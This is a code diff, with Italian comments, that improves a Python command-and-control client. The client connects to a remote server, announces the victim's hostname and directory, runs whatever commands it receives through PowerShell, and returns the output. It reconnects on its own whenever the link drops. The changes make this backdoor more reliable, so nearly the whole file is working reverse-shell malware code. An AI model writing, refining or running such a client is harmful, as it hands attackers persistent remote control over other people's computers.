@@ -15,21 +15,24 @@ class C2Client:
         self.hostname = socket.gethostname()
 
     def connect(self):
-        """Tenta la connessione al server finché non ha successo."""
         while True:
             try:
+                # Chiudi il socket precedente se esiste per pulizia
+                if self.socket:
+                    self.socket.close()
+                
                 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.socket.connect((self.host, self.port))
                 
-                # Handshake iniziale: invia Path e Hostname al server
                 handshake_data = f"{self.current_dir}#{self.hostname}"
                 self.socket.send(handshake_data.encode('utf-8'))
                 
                 print(f"[*] Connesso a {self.host}:{self.port}")
-                return True
+                return True # <--- Fondamentale
             except (socket.error, ConnectionRefusedError):
                 print("[!] Server non trovato, riprovo in 5 secondi...")
                 time.sleep(5)
+
 
     def execute_command(self, command):
         """Esegue il comando tramite PowerShell e cattura output e nuova posizione."""
@@ -59,24 +62,43 @@ class C2Client:
     def run(self):
         """Ciclo principale di ricezione ed esecuzione."""
         while True:
-            if not self.socket or self.connect():
+            # Tenta la connessione. Se fallisce, il metodo connect() 
+            # internamente ha già un loop che riprova ogni 5 secondi.
+            if self.connect():
                 try:
                     while True:
                         # Riceve il comando dal server
+                        # Verifichiamo che il socket esista prima di chiamare recv
+                        if self.socket is None:
+                            break
+                            
                         data = self.socket.recv(4096).decode('utf-8', errors="replace").strip()
                         
                         if not data:
+                            print("[!] Connessione persa (dati vuoti).")
                             break
                         
                         if data == "cclose":
                             print("[*] Chiusura connessione richiesta dal server.")
                             self.socket.close()
-                            return
+                            return # Esci completamente dal programma
 
-                        # Esegue e risponde con il formato atteso: "output#path#nuovopath"
+                        # Esegue e risponde
                         result = self.execute_command(data)
                         response = f"{result}#path#{self.current_dir}"
                         self.socket.send(response.encode('utf-8'))
 
-                except (ConnectionResetError, BrokenPipeError):
-                    print("[!] Connessione inter
+                except (ConnectionResetError, BrokenPipeError, socket.error) as e:
+                    print(f"[!] Errore di rete durante la sessione: {e}")
+                finally:
+                    if self.socket:
+                        self.socket.close()
+                        self.socket = None # Cruciale: resettiamo a None per il prossimo tentativo
+            
+            # Aspetta un attimo prima di tentare una nuova connessione totale
+            time.sleep(2)
+
+if __name__ == "__main__":
+    # Sostituisci con l'IP del tuo server
+    client = C2Client(host="127.0.0.1", port=7771)
+    client.run()
